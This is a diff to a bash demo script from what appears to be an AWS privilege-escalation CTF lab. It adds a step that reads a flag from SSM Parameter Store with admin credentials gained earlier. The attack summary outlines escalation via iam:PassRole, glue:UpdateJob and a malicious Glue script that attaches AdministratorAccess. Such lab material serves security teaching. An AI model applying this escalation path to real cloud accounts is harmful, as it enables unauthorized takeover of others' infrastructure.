@@ -327,8 +327,11 @@ else
 fi
 echo ""
 echo "Attempting to list IAM users..."
+# Restore helpful permissions first — the deny policy overrides AdministratorAccess otherwise
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+use_starting_creds
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -338,12 +341,29 @@ else
 fi
 echo ""
 
+# [EXPLOIT]
+# Step 13: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+echo -e "${YELLOW}Step 13: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-005-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -354,12 +374,14 @@ echo "5. Updated Glue job script to malicious escalation script"
 echo "6. Started Glue job run which executed the malicious Python script"
 echo "7. Script attached AdministratorAccess to starting user"
 echo "8. Achieved: Administrator Access"
+echo "9. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (iam:PassRole + glue:UpdateJob)"
 echo -e "  → Update existing Glue Job with $TARGET_ROLE and malicious script"
 echo -e "  → (glue:StartJobRun) → Execute Python Script"
 echo -e "  → (iam:AttachUserPolicy) → Admin Access"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
